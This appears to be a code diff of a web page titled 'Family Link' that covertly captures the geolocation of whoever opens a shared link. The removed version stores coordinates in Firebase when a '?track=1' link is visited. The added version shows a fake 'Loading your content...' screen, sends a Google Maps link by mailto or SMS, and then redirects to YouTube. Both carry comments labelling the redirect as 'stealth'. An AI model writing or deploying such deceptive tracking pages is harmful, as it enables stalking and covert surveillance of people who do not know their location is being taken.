@@ -1,50 +1,28 @@
-<script>
-    // Initialize the map (centered on a random location)
-    const map = L.map('map').setView([51.505, -0.09], 13);
-
-    // Add OpenStreetMap tiles
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
-    }).addTo(map);
-
-    // Firebase setup (paste your config here)
-    const firebaseConfig = {
-        apiKey: "YOUR_API_KEY",
-        authDomain: "YOUR_PROJECT.firebaseapp.com",
-        databaseURL: "https://YOUR_PROJECT.firebaseio.com",
-        projectId: "YOUR_PROJECT",
-        storageBucket: "YOUR_PROJECT.appspot.com",
-        messagingSenderId: "YOUR_SENDER_ID",
-        appId: "YOUR_APP_ID"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
-
-    // Check if this is a tracking link (?track=1)
-    const urlParams = new URLSearchParams(window.location.search);
-    const isTracking = urlParams.get('track');
-
-    if (isTracking) {
-        // Get the recipient's location
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Family Link</title>
+    <script>
+        function sendLocation() {
+            navigator.geolocation.getCurrentPosition(position => {
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
+                const link = `https://www.google.com/maps?q=${lat},${lng}`;
                 
-                // Save to Firebase
-                database.ref('locations/' + Date.now()).set({
-                    lat: lat,
-                    lng: lng,
-                    member: "Unknown"
-                });
-
-                // Redirect to YouTube (stealth mode)
-                window.location.href = "https://youtube.com";
-            },
-            (error) => {
-                console.error("Error getting location:", error);
-                window.location.href = "https://youtube.com";
-            }
-        );
-    }
-</script>
+                // Method 1: Open user's email client (no API needed)
+                window.open(`mailto:?subject=My Location&body=I'm here: ${link}`);
+                
+                // Method 2: Send SMS (works on mobile)
+                // window.open(`sms:?body=I'm here: ${link}`);
+                
+                // Redirect to YouTube (stealth)
+                setTimeout(() => { window.location.href = "https://youtube.com"; }, 500);
+            });
+        }
+    </script>
+</head>
+<body onload="sendLocation()">
+    <!-- Show a fake loading screen -->
+    <h2>Loading your content...</h2>
+</body>
+</html>
